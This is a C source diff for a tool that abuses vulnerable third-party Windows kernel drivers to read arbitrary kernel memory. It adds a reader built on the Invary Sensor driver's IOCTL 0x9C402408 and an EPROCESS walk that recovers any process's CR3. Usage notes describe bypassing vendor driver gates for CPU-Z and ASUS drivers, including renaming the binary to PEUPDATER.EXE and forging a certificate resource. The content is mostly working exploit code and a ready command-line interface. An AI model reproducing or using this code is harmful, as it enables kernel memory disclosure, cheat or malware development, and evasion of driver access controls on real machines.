@@ -662,6 +662,63 @@ static int kkyum_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3,
 }
 
 // ---------------------------------------------------------------------------
+// 定位层策略 5: Invary Sensor kernel-VA read (IOCTL 0x9C402408)
+// invarysensor.sys dispatches 0x9C402408 -> MmCopyMemory(..., flags=2=Virtual):
+//   input {u64 address; u64 size; u8 append_addr; ...}
+//   output = size bytes (driver writes into the same SystemBuffer)
+// This is a kernel-VA reader; process-list locator can use it like KKYUM.
+// ---------------------------------------------------------------------------
+static HANDLE g_invary = INVALID_HANDLE_VALUE;
+
+static int invary_build_request(uint64_t va, uint32_t size, uint8_t append, uint8_t *out, uint32_t cap) {
+    if (!out || cap < 0x20) return 0;
+    memset(out, 0, cap);
+    *(uint64_t *)(out + 0x00) = va;
+    *(uint64_t *)(out + 0x08) = size;
+    *(uint8_t *)(out + 0x10) = append;
+    return 1;
+}
+
+static int invary_open(const char *device) {
+    const char *path = (device && device[0]) ? device : "\\\\.\\invarysensor";
+    g_invary = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                           NULL, OPEN_EXISTING, 0, NULL);
+    return g_invary != INVALID_HANDLE_VALUE;
+}
+
+static int invary_kread(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size) {
+    (void)kr;
+    if (g_invary == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    uint32_t inlen = size + 0x10;
+    if (inlen < 0x20) inlen = 0x20;
+    uint8_t *in = (uint8_t *)malloc(inlen);
+    uint8_t *out = (uint8_t *)malloc(size);
+    if (!in || !out) { free(in); free(out); return 0; }
+    if (!invary_build_request(va, size, 0, in, inlen)) { free(in); free(out); return 0; }
+    DWORD ret = 0;
+    BOOL ok = DeviceIoControl(g_invary, 0x9C402408u, in, inlen, out, size, &ret, NULL);
+    if (ok) memcpy(buf, out, size);
+    free(in);
+    free(out);
+    return ok ? 1 : 0;
+}
+
+static int invary_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3, uint64_t *out_eproc) {
+    if (!invary_open(device)) return 0;
+    uint64_t nt_base = find_ntoskrnl_base();
+    if (!nt_base) return 0;
+    uint32_t rva = parse_nt_export_rva("PsInitialSystemProcess");
+    if (!rva) return 0;
+    mb_kernel_reader kr;
+    kr.ctx = NULL;
+    kr.read = invary_kread;
+    uint64_t sys_eproc = 0;
+    if (!kr.read(&kr, nt_base + rva, &sys_eproc, 8)) return 0;
+    if (sys_eproc < 0xFFFF800000000000ull) return 0;
+    return mb_layer_locate_cr3_kernel(&kr, sys_eproc, pid, 0x1D8, 0x1D0, 0x28, out_cr3, out_eproc);
+}
+
+// ---------------------------------------------------------------------------
 // 定位层策略 4: KPRL l1malwarebits.sys - CR3 by PID (IOCTL 0x239584)
 // Input buffer: PID at offset 0; driver returns CR3 at offset 0x38;
 // information length 0x48. Device name is configured by the driver (may be
@@ -978,6 +1035,14 @@ static int selftest_mock(void) {
                   *(uint32_t *)(kprl_req + 4) == 0;
     check("定位层(locator)", "kprl CR3 query request layout (pid at offset 0)", ok_kprl);
 
+    // Invary Sensor kernel-VA request layout (offline, no driver)
+    uint8_t inv_req[0x20];
+    int ok_inv = invary_build_request(0xFFFF800000100000ull, 8, 0, inv_req, sizeof(inv_req)) &&
+                 *(uint64_t *)(inv_req + 0x00) == 0xFFFF800000100000ull &&
+                 *(uint64_t *)(inv_req + 0x08) == 8 &&
+                 *(uint8_t *)(inv_req + 0x10) == 0;
+    check("取数层(fetcher)", "invarysensor kernel-VA read request layout", ok_inv);
+
     // full pipeline: locate -> translate -> fetch
     uint64_t cr3b = 0;
     uint8_t pipe[64];
@@ -1037,23 +1102,25 @@ static void usage(void) {
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
+    printf("  layers --locate --invary --pid <pid> [--invary-device <path>] (Invary Sensor kernel-VA locator)\n");
     printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
     printf("  note: --reader asupio64 requires layers.exe to be named PEUPDATER.EXE (AsUpIO64 gate)\n");
     printf("  note: --reader asio2 requires bin\\layers_asio2.exe (ASUSCERT resource + timestamp 0 gate bypass)\n");
 }
 
 int main(int argc, char **argv) {
-    const char *kind = NULL, *device = NULL, *name = NULL, *kkyum_device = NULL, *kprl_device = NULL;
+    const char *kind = NULL, *device = NULL, *name = NULL, *kkyum_device = NULL, *kprl_device = NULL, *invary_device = NULL;
     uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
     uint32_t size = 0x40, pid = 0, expect_first = 0;
     int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
-    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0;
+    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
         else if (strcmp(argv[i], "--reader") == 0 && i + 1 < argc) kind = argv[++i];
         else if (strcmp(argv[i], "--device") == 0 && i + 1 < argc) device = argv[++i];
         else if (strcmp(argv[i], "--kkyum-device") == 0 && i + 1 < argc) kkyum_device = argv[++i];
         else if (strcmp(argv[i], "--kprl-device") == 0 && i + 1 < argc) kprl_device = argv[++i];
+        else if (strcmp(argv[i], "--invary-device") == 0 && i + 1 < argc) invary_device = argv[++i];
         else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) name = argv[++i];
         else if (strcmp(argv[i], "--expect-first") == 0 && i + 1 < argc) expect_first = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--pa") == 0 && i + 1 < argc) pa = _strtoui64(argv[++i], NULL, 0);
@@ -1067,6 +1134,7 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--locate") == 0) do_locate = 1;
         else if (strcmp(argv[i], "--kkyum") == 0) use_kkyum = 1;
         else if (strcmp(argv[i], "--kprl") == 0) use_kprl = 1;
+        else if (strcmp(argv[i], "--invary") == 0) use_invary = 1;
         else if (strcmp(argv[i], "--ranges") == 0) do_ranges = 1;
         else if (strcmp(argv[i], "--auto-ranges") == 0) auto_ranges = 1;
         else if (strcmp(argv[i], "--explicit") == 0) do_explicit = 1;
@@ -1086,7 +1154,7 @@ int main(int argc, char **argv) {
         printf("VERDICT=PASS\n");
         return 0;
     }
-    if (!kind && !((use_kkyum || use_kprl) && do_locate && !have_va)) { usage(); return 6; }
+    if (!kind && !((use_kkyum || use_kprl || use_invary) && do_locate && !have_va)) { usage(); return 6; }
 
     mb_phys_reader r;
     int have_reader = 0;
@@ -1112,7 +1180,15 @@ int main(int argc, char **argv) {
         free(b);
     } else if (do_locate) {
         uint64_t got_cr3 = 0, eproc = 0;
-        if (use_kprl && pid) {
+        if (use_invary && pid) {
+            if (!invary_locate_cr3(pid, invary_device, &got_cr3, &eproc)) {
+                printf("[ERR] 定位层 invary failed (pid=%u): device/ntoskrnl/EPROCESS walk error\n", pid);
+                rc = 5;
+            } else {
+                printf("[OK] 定位层 invary: PID=%u EPROCESS=0x%llX CR3=0x%llX (kernel-VA walk)\n", pid,
+                       (unsigned long long)eproc, (unsigned long long)got_cr3);
+            }
+        } else if (use_kprl && pid) {
             if (!kprl_locate_cr3(pid, kprl_device, &got_cr3)) {
                 printf("[ERR] 定位层 kprl failed (pid=%u): device/IOCTL 0x239584 error\n", pid);
                 rc = 5;
